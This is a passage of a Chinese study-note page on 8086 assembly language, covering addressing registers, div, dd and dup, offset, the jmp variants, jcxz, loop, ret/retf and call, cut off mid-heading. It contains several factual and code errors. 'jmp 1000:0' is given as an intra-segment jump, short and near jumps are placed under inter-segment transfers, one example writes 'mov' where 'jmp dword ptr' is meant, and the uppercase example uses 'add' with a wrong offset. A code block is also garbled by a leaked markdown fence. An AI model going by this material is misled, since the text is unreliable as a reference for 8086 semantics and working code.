mov ax,4c00H<br> int 21H<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>e.g 将 datasg 段每个单词前四个字母改为大写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assumecs:codesg,ss:stacksg,ds:datasg<br>stacksg segment<br>dw 0,0,0,0,0,0,0,0<br>stacksg ends<br>datasg segment<br>db&#x27;1. display      &#x27;<br>db&#x27;2. brows        &#x27;<br>db&#x27;3. replace      &#x27;<br>db&#x27;4. modify       &#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br>mov ds,ax<br>        mov bx,0<br>        <br>        mov cx,4<br>        <br>    s0:mov si,0<br>    mov cx,4<br>    <br>    s:mov al,[bx+si+3]<br>    add al,11011111b<br>    mov [bx+si],al<br>    inc si<br>    loop s<br>    <br>    add bx,16<br>    loop s0<br>    <br>    mov ax,4c00H<br> int 21H<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="八、数据处理的两个基本问题"><a href="#八、数据处理的两个基本问题" class="headerlink" title="八、数据处理的两个基本问题"></a>八、数据处理的两个基本问题</h1><p>reg 寄存器的集合包括：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di</p><p>sreg 段寄存器集合包括：ds、ss、cs、es</p><h3 id="8-1-bx、si、di-和-bp"><a href="#8-1-bx、si、di-和-bp" class="headerlink" title="8.1 bx、si、di 和 bp"></a>8.1 bx、si、di 和 bp</h3><p>1）在 8086CPU 中，<strong>只有这四个寄存器可以在“[……]”中进行内存单元的寻址</strong></p><p>2）在[……]中，这4个寄存器可以单个出现，或只能以4种组合出现：&#x3D;&#x3D;<strong>bx+si、bx+di、bp+si、bp+di</strong>&#x3D;&#x3D;</p><p>3）只要在[…]中使用寄存器bp,而指令中没有显性地给出段地址，<strong>段地址就默认在ss中</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bp]//(ax)=((ss)*16+(bp))<br>mov ax,[bp+idata]//(ax)=((ss)*16+(bp)+idata)<br>mov ax,[bp+si]//(ax)=((ss)*16+(bp)+(si))<br>mov ax,[bp+si+idata]//(ax)=((ss)*16+(bp)+(si)+idata)<br></code></pre></td></tr></table></figure><h3 id="8-3-数据位置的表达"><a href="#8-3-数据位置的表达" class="headerlink" title="8.3 数据位置的表达"></a>8.3 数据位置的表达</h3><p>1）立即数 (idata)</p><p>2）寄存器</p><p>3）段地址（SA）和偏移地址（EA）</p><p>存放段地址的寄存器可以是默认的，比如以下指令，段地址默认在 ds 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[0]<br>mov ax,[di]<br>mov ax,[bx+8]<br>mov ax,[bx+si]<br>mov ax,[bx+si+8]<br></code></pre></td></tr></table></figure><p>段地址默认在ss中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bp]<br>mov ax,[bp+8]<br>mov ax,[bp+si]<br>mov ax,[bp+si+8]<br></code></pre></td></tr></table></figure><h3 id="8-4-寻址方式"><a href="#8-4-寻址方式" class="headerlink" title="8.4 寻址方式"></a>8.4 寻址方式</h3><p><img src="https://img.dkdun.cn/v1/2025/12/efb17885fa7dfbc1.png"></p><h3 id="8-5-指令要处理得到数据有多长"><a href="#8-5-指令要处理得到数据有多长" class="headerlink" title="8.5 指令要处理得到数据有多长"></a>8.5 指令要处理得到数据有多长</h3><p>1）通用寄存器指明要处理的数据的尺寸</p><p>2）没有寄存器名存在时，<strong>用操作符 X ptr 指明内存单元的长度，X 可以为 byte 或 word</strong></p><p>3）push 不用指明访问字单元还是字节单元，<strong>push 指令只进行字操作</strong></p><h3 id="8-7-div指令"><a href="#8-7-div指令" class="headerlink" title="8.7 div指令"></a>8.7 div指令</h3><p>1）除数：有 8 位和 16 位，在一个 reg 或内存单元中</p><p>2）被除数：默认放在 AX 或 DX 和 AX 中，除数为 8 位，被除数则为 16 位，默认在 AX 中存放；除数为 16 位，被除数则为 32 位，在 DX 和 AX 中存放，DX 存放高16位，AX 存放低 16 位</p><p>3）结果：除数为 8 位，则 AL 存储除法操作的商，AH 存储除法操作的余数；</p><p>​除数为16位，AX 存储商，DX 存储余数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div reg<br>div 内存单元<br></code></pre></td></tr></table></figure><p>用多种方法表示一个内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div byte ptr ds:[0]<br>//(al)=(ax)/((ds)*16+0)的商<br>//(ah)=(ax)/((ds)*16+0)的余数<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div word ptr es:[0]<br>//(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商<br>//(dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div byte ptr [bx+si+8]<br>//(al)=(ax)/((ds)*16+(si)+8)的商<br>//(ah)=(ax)/((ds)*16+(si)+8)的余数<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div word ptr [bx+si+8]<br>//(ax)=[(dx)*10000H+(ax)]/((ds)+(si)+8)的商<br>//(dx)=[(dx)*10000H+(ax)]/((ds)+(si)+8)的余数<br></code></pre></td></tr></table></figure><p>利用除法指令计算 100001&#x2F;100</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">被除数100001大于65535，不能用ax寄存器存放，用dx和ax两个寄存器联合存放100001.<br>除数小于255，用8位寄存器存放<br><br>mov dx,1<br>mov ax,86A1H<br>mov bx,100<br>div bx<br>//(ax)=03E8H,(dx)=1<br></code></pre></td></tr></table></figure><h3 id="8-8-伪指令-dd"><a href="#8-8-伪指令-dd" class="headerlink" title="8.8 伪指令 dd"></a>8.8 伪指令 dd</h3><p>dd 用来定义 dword(double word,双字)型整数</p><p>用 div 计算 data 段中第一个数据除以第二个数据后的结果，商存在第三个数据存储单元中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br>  dd 100001<br>  dw 100<br>  dw 0<br>  <br>  mov ax,data<br>  mov ds,ax<br>  mov ax,ds:[0]//ds:0字单元中的低16位存储在ax中<br>  mov dx,ds:[2]//ds:2中高16位存储到dx中<br>  div word ptr ds:[4]//dx:ax中的32位数据除以ds:4字单元中的数据<br>  mov ds:[6],ax//存储<br>  <br>data ends<br></code></pre></td></tr></table></figure><h3 id="8-9-dup"><a href="#8-9-dup" class="headerlink" title="8.9 dup"></a>8.9 dup</h3><p>操作符，由编译器识别处理，用来进行数据的重复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">db 3 dup (0)<br>//定义3个字节，值为0，相当于db 0,0,0<br><br>db 3 dup (0,1,2)<br>//定义了9个字节，0、1、2、0、1、2、0、1、2，相当于db 0,1,2,0,1,2,0,1,2<br><br>db 3 dup (&#x27;abc&#x27;,&#x27;ABC&#x27;)<br>//18个字节，‘abcABCabcABCabcABC’,相当于db &#x27;abcABCabcABCabcABC&#x27;<br></code></pre></td></tr></table></figure><p>dup 使用格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">db 重复的次数 dup (重复的字节型数据)<br>dw 重复的次数 dup (重复的字型数据)<br>dd 重复的次数 dup (重复的双字型数据)<br></code></pre></td></tr></table></figure><h1 id="九、-转移指令的原理"><a href="#九、-转移指令的原理" class="headerlink" title="九、 转移指令的原理"></a>九、 转移指令的原理</h1><p>可以修改 IP，或同时修改 CS 和 IP 的指令</p><p>8086CPU 转移行为分为两类：</p><ul><li><p><strong>只修改IP，称为段内转移</strong>，比如：jmp 1000:0</p></li><li><p><strong>同时修改CS和IP时，称为段间转移</strong>，比如：jmp 1000:0</p></li></ul><p><strong>段间转移分为：短转移和近转移</strong></p><ul><li>短转移 IP 修改范围为-128~127</li><li>近转移 IP 的修改范围为-32768~32767</li></ul><p>8086CPU 转移指令：</p><ul><li>无条件转移指令（如：jmp）</li><li>条件转移指令</li><li>循环指令（如：loop）</li><li>过程</li><li>中断</li></ul><h3 id="9-1-操作符-offset"><a href="#9-1-操作符-offset" class="headerlink" title="9.1 操作符 offset"></a>9.1 操作符 offset</h3><p>操作符 offset 由编译器处理，取得标号的偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>  start:mov ax,offset start//相当于mov ax,0<br>  s:mov ax,offset s//相当于mov ax,3<br>codesg ends<br>end start<br>//start所标记的指令是代码段的第一条指令，偏移地址为0<br>//s所标记的指令为第二条，第一条指令长度为3个字节，则s的偏移地址为3<br></code></pre></td></tr></table></figure><p>e.g 使程序在运行中将 s 处的一条指令复制到 s0 处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">//将s处的指令复制到s0处就是将cs:offset s处数据复制到cs:offset s0<br><br>assume cs:codesg<br>codesg segment<br>s:mov ax,bx//mov ax,bx的机器码占2个字节<br>mov si,offset s<br>mov di,offset s0<br>mov ax,cs:[si]<br>mov cs:[di],ax<br>s0:nop//nop占一个字节<br>nop<br>codesg ends<br>end s<br></code></pre></td></tr></table></figure><h3 id="9-2-jmp-指令"><a href="#9-2-jmp-指令" class="headerlink" title="9.2 jmp 指令"></a>9.2 jmp 指令</h3><p>无条件转移指令</p><p>jmp 指令要给出两种信息：</p><ul><li>转移的目的地址</li><li>转移的距离（段间转移、段内短转移、段内近转移）</li></ul><h3 id="9-3-根据位移进行转移的-jmp-指令"><a href="#9-3-根据位移进行转移的-jmp-指令" class="headerlink" title="9.3 根据位移进行转移的 jmp 指令"></a>9.3 根据位移进行转移的 jmp 指令</h3><ul><li><p>jmp short 标号（转到标号处执行指令）&#x2F;&#x2F;段内短转移</p></li><li><p>CPU 在执行 jmp 指令时不需要转移的目的地址</p></li><li><p><strong>“jmp short 标号”:功能：(IP)&#x3D;(IP)+8 位位移</strong></p><ul><li>8位位移&#x3D;标号处的地址-jmp 指令后的第一个字节的地址</li><li>short 指明此处的位移为8位位移</li><li>8位位移范围为-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul></li><li><p><strong>“jmp near ptr  标号”:(IP)&#x3D;(IP)+16 位位移</strong></p><ul><li>16位位移&#x3D;标号处的地址-jmp指令的第一个字节的地址</li><li>near ptr 指明此处的位移为16位位移，进行的是段内近转移</li><li>16位位移的范围为-32768~32767，用补码表示</li><li>16位位移由编译程序在编译时算出</li></ul></li></ul><h3 id="9-4-转移的目的地址在指令中的-jmp-指令"><a href="#9-4-转移的目的地址在指令中的-jmp-指令" class="headerlink" title="9.4 转移的目的地址在指令中的 jmp 指令"></a>9.4 转移的目的地址在指令中的 jmp 指令</h3><p>“jmp  far  ptr  标号”实现<strong>段间转移，又称为远转移</strong>**</p><ul><li>(CS)&#x3D;标号所在段的段地址；</li><li>(IP)&#x3D;标号在段中的偏移地址</li><li>far ptr 指明了指令用标号的段地址和偏移地址修改 CS 和 IP</li></ul><h3 id="9-5-转移地址在寄存器中的-jmp-指令"><a href="#9-5-转移地址在寄存器中的-jmp-指令" class="headerlink" title="9.5 转移地址在寄存器中的 jmp 指令"></a>9.5 转移地址在寄存器中的 jmp 指令</h3><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 16位reg<br></code></pre></td></tr></table></figure><p>功能：(IP)&#x3D;（16位reg）</p><h3 id="9-6-转移地址在内存中的-jmp-指令"><a href="#9-6-转移地址在内存中的-jmp-指令" class="headerlink" title="9.6 转移地址在内存中的 jmp 指令"></a>9.6 转移地址在内存中的 jmp 指令</h3><p>1）<strong>jmp  word  ptr   内存单元地址（段内转移）</strong></p><ul><li><p>从内存单元地址处开始存放一个字，是转移的目的偏移地址</p></li><li><p>内存单元地址可用寻址方式的任一格式给出</p></li><li><pre><code class="assembly">mov ax,0123Hmov ds:[0],axjmp word ptr ds:[0]//执行后(IP)=0123Hmov ax,0123Hmov [bx],axjmp word ptr [bx]//执行后(IP)=0123H<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br><br><span class="hljs-number">2</span>）**<span class="hljs-keyword">jmp</span>  <span class="hljs-built_in">dword</span>  <span class="hljs-built_in">ptr</span>  内存单元地址（段间转移）**<br><br>- 从内存单元开始存放两个字，**高地址处的字是转移的目的段地址，低地址是偏移地址**<br><br>- (<span class="hljs-built_in">CS</span>)=(内存单元地址+<span class="hljs-number">2</span>)<br><br>  （<span class="hljs-built_in">IP</span>）=（内存单元地址）<br><br>- <span class="hljs-string">```</span>assembly<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0123H</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>],<span class="hljs-built_in">ax</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">2</span>],<span class="hljs-number">0</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>]<br>  //执行后(<span class="hljs-built_in">CS</span>)=<span class="hljs-number">0</span>,(<span class="hljs-built_in">IP</span>)=<span class="hljs-number">0123H</span>,<span class="hljs-built_in">CS</span>:<span class="hljs-built_in">IP</span>指向<span class="hljs-number">0000</span>:<span class="hljs-number">0123</span><br>  <br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0123H</span><br>  <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">ax</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">2</span>],<span class="hljs-number">0</span><br>  <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">bx</span>]<br>  //执行后，(<span class="hljs-built_in">CS</span>)=<span class="hljs-number">0</span>,(<span class="hljs-built_in">IP</span>)=<span class="hljs-number">0123H</span>,<span class="hljs-built_in">CS</span>:<span class="hljs-built_in">IP</span>指向<span class="hljs-number">0000</span>:<span class="hljs-number">0123</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>e.g. 使 jmp 指令执行后，CS:IP 指向程序的第一条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>data segment<br>dd12345678H<br>data ends<br>code segment<br> start:mov ax,data<br> mov ds,ax<br> mov bx,0<br> mov [bx],bx//或者 mov [bx],word ptr 0或者mov [bx],offset start<br> //将IP设置为0<br> mov [bx+2],cs//或 mov [bx+2],cs   或 mov [bx+2],seg code<br> //将cs段地址放入内存单元<br> jmp dword ptr ds:[0]<br>code ends<br>end start<br>//jmp dword ptr ds:[0]为段间转移,(CS)=(内存单元地址+2),(IP)=(内存单元地址)<br>//CS:IP指向第一条指令,第一条程序地址为cs:0,设置CS:IP指向cs:0<br></code></pre></td></tr></table></figure><p>e.g 2000:1000  BE  00  06  00  00  00 ……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov es,ax<br>jmp dword ptr es:[1000H]<br>//(CS)=0006H,(IP)=00BEH<br></code></pre></td></tr></table></figure><h3 id="9-7-jcxz-指令"><a href="#9-7-jcxz-指令" class="headerlink" title="9.7 jcxz 指令"></a>9.7 jcxz 指令</h3><p>jcxz 指令为有<strong>条件转移指令，都是短转移</strong>，在对应的机器码中包含转移的位移，而不是目的地址。IP修改范围为:-128~127</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jcxz  标号(如果(cx)=0),转移到标号处执行<br>当(cx)=0时,(IP)=(IP)+8位位移<br></code></pre></td></tr></table></figure><ul><li>8位位移&#x3D;标号处的地址 - jcxz 指令后的第一个字节的地址</li><li>8位位移的范围为-128~127，用补码表示</li></ul><p>“ jcxz  标号 ”功能相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">if ((cx)==0) <br>jmp short 标号<br></code></pre></td></tr></table></figure><p>e.g 利用 jcxz 指令，实现在内存 2000H 段中查找第一个值为 0 的字节，找到后将它的偏移地址存储在 dx 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,2000H<br> mov ds,ax<br> <br> mov bx,0<br> s:mov ch,0//将ch寄存器清零。ch寄存器被用作辅助寄存器，cx寄存器由ch和cl组成，用于循环计数<br> mov cl,[bx]//将bx指向的内存地址的内容送入cl中<br> jcxz ok//if(cx==0),就是ch和cl为0<br> inc bx<br> jmp short s<br> <br> ok:mov dx,bx<br> mov ax,4c00h<br> int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="9-8-loop-指令"><a href="#9-8-loop-指令" class="headerlink" title="9.8 loop 指令"></a>9.8 loop 指令</h3><p>loop 指令为循环指令，<strong>所有循环指令都是短转移</strong></p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loop 标号 (cx)=(cx)-1,如果(cx)不为0，转移到标号处执行、<br>即：<br>(cx)=(cx)-1<br>如果(cx)不为0,(IP)=(IP)+8位位移<br></code></pre></td></tr></table></figure><ul><li>8位位移&#x3D;标号处地址 - loop 指令后的第一个字节的地址</li><li>8位位移的范围为-128~127，用补码表示</li></ul><p>“ loop ”相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(cx)--<br>if(cx)!=0)<br>jmp short 标号<br></code></pre></td></tr></table></figure><p>e.g 利用 loop 指令，实现在内存 2000H 段中查找第一个值为 0 的字节，将偏移地址存储在 dx 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,2000H<br> mov ds,ax<br> mov bx,0<br> s:mov cl,[bx]<br> mov ch,0<br> inc cx<br> inc bx<br> loop s<br> ok:dec bx<br> mov dx,bx//dec和inc相反，dec bx进行操作为:(bx)=(bx)-1<br> mov ax,4c00h<br> int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="十、CALL和RET指令"><a href="#十、CALL和RET指令" class="headerlink" title="十、CALL和RET指令"></a>十、CALL和RET指令</h1><h3 id="10-1-ret-和-retf"><a href="#10-1-ret-和-retf" class="headerlink" title="10.1 ret 和 retf"></a>10.1 ret 和 retf</h3><p>ret 指令用栈中的数据，修改 IP 的内容，从而实现转移</p><p>retf 修改 CS 和 IP 的内容，实现转移</p><p>执行 ret 指令时 : 相当于进行：pop  IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(IP)=((ss)*16+(sp))<br>(sp)=(sp)+2<br></code></pre></td></tr></table></figure><p>执行 retf 指令时：相当于进行：pop  IPpop  CS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(IP)=((ss)*16+(sp))<br>(sp)=(sp)+2<br>(CS)=((ss)*16+(sp))<br>(sp)=(sp)+2<br></code></pre></td></tr></table></figure><p>ret 指令执行后，(IP)&#x3D;0,CS:IP 指向代码段的第一条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>stack segment<br>db 16 dup (0)<br>stack ends<br>code segment<br>mov ax,4c00h<br>int 21h<br> start:mov ax,stack<br> mov ss,ax<br> mov sp,16<br> mov ax,0<br> push ax<br> mov bx,0<br> ret<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>retf 指令执行后，CS:IP 指向代码段的第一条命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>stack segment<br>db 16 dup (0)<br>stack ends<br>code segment<br>mov ax,4c00h<br>int 21h<br> start:mov ax,stack<br> mov ss,ax<br> mov sp,16<br> mov ax,0<br> push cs<br> push ax<br> mov bx,0<br> retf<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>e.g 实现从内存 1000:0000 处开始执行指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>stack segment<br>db 16 dup (0)<br>stack ends<br>code segment<br> start:mov ax,stack<br> mov ss,ax<br> mov sp,16<br> mov ax,1000h<br> push ax<br> mov ax,0<br> push ax<br> retf<br>code ends<br>end start<br>//先将段地址CS入栈,再将偏移地址IP入栈<br></code></pre></td></tr></table></figure><h3 id="10-3-根据位移进行转移的-call-指令"><a href="#10-3-根据位移进行转移的-call-指令" class="headerlink" title="10.3 根据位移进行转移的 call 指令"></a>10.3 根据位移进行转移的 call 指令</h3><p>CPU 执行 call 指令时，进行：</p><ul><li>将当前 IP 或 CS 和 IP 压入栈中</li><li>转移</li></ul><p><strong>call   标号(将当前 IP 压栈后，转到标号处执行指令)</strong></p><p>执行 call 指令时，进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1) (sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>2) (IP)=(IP)+16位位移<br></code></pre></td></tr></table></figure><ul><li>16位位移 &#x3D; 标号处的地址 - call 指令后的第一个字节的地址</li><li>16位位移的范围为-32768~32767</li></ul><p>执行 “ call   标号 “时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push IP<br>jmp near ptr 标号<br></code></pre></td></tr></table></figure><h3 id="10-4-转移的目的地址在指令中的-call-指令"><a href="#10-4-转移的目的地址在指令中的-call-指令" class="headerlink" title="10.4 转移的目的地址在指令中的 call 指令"></a>10.4 转移的目的地址在指令中的 call 指令</h3><p>” call  far  ptr  标号 “ 实现段间转移</p><p>执行时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1) (sp)=(sp)-2<br>((ss)*16+(sp))=(CS)<br>(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>2) (CS)=标号所在段的段地址<br>(IP)=标号在段中的偏移地址<br></code></pre></td></tr></table></figure><p>执行” call  far  ptr  标号 “时，相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push CS<br>push IP<br>jmp far ptr 标号<br></code></pre></td></tr></table></figure><h3 id="10-5-转移地址在寄存器中的-call-指令"><a href="#10-5-转移地址在寄存器中的-call-指令" class="headerlink" title="10.5 转移地址在寄存器中的 call 指令"></a>10.5 转移地址在寄存器中的 call 